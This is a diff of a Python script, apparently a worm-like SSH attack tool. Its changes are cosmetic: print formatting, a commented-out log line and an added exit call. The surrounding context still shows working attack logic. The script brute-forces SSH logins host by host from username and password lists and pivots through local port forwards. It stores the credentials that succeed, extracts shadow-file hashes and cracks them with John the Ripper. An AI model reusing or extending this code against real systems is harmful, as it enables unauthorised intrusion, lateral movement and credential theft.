@@ -114,7 +114,7 @@ def begin_attack(client):
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
-        verbose("Brute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port))
+        verbose("\nBrute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port))
 
         user_len = len(USERNAMES)
         passwd_len = len(PASSWORDS)
@@ -137,7 +137,7 @@ def begin_attack(client):
                         verbose("Connected to %s:%s" % (server.host, server.ssh_port))
                     else:
                         client.connect("localhost", server.local_forward, username=userCred, password=passCred)
-                        verbose("Connecting to localhost:%d -> %s:%s" % (server.local_forward, server.host, server.ssh_port))
+                        # verbose("Connecting to localhost:%d -> %s:%s" % (server.local_forward, server.host, server.ssh_port))
                     logged_in = True
                     # add the user/pass combo to the server object dict of accounts
                     server.accounts[userCred] = passCred
@@ -193,7 +193,7 @@ def begin_attack(client):
             # put current computer back in the queue
             q.put(server)
 
-    print "QUEUE EMPTY"
+    print "QUEUE EMPTY..."
 
 # shadow_file = file ptr
 def user_hashes(shadow_file):
@@ -219,7 +219,7 @@ def crack_with_john(hashes_lst):
         f.write(h)
     f.close()
 
-    print "Cracking newly found hashes..."
+    print "Cracking newly found hashes...\n"
 
     # supress john output
     os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
@@ -284,3 +284,5 @@ if __name__ == "__main__":
         q.put(compObj)
 
     begin_attack(client)
+    # stops running threads
+    sys.exit(0)
